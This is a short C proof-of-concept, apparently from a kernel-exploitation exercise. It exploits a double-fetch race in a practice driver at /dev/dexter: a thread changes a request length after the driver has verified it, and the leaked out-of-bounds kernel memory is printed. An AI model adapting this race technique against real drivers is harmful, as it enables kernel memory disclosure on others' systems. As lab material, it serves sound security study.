/**
 * Double fetch test
 * 
 */

#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002

typedef struct {
  char *ptr;
  size_t len;
} request_t;

int fd;
request_t req;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int set(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_SET, &req);
}

int get(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_GET, &req);
}

int race_win = 0;

// Race to modify req.len after the module's verify_request has returned
// successfully, so that driver's copy_data_to_user reads a different length
// on the second fetch, resulting in an out-of-bounds read.
void *race(void *arg) {
  while (!race_win) {
    req.len = 0x100;
    usleep(1);
  }
  return NULL;
}

int main() {
  fd = open("/dev/dexter", O_RDWR);
  if (fd == -1) fatal("/dev/dexter");

  // both arrays filled with zeros
  char buf[0x100] = {}, zero[0x100] = {};

  // Note that there is no need for calling ioctl CMD_SET to set the kernel
  // buffer memory before starting the race, since that buffer is allocated
  // using kzalloc() which sets its memory to zero.
  pthread_t th;
  pthread_create(&th, NULL, race, NULL);
  while (!race_win) {
    get(buf, 0x20);
    if (memcmp(buf, zero, 0x100) != 0) {
      race_win = 1;
      break;
    }
  }
  pthread_join(th, NULL);

  for (int i = 0; i < 0x100; i += 8) {
    printf("%02x: 0x%016lx\n", i, *(unsigned long*)&buf[i]);
  }

  close(fd);
  return 0;
}
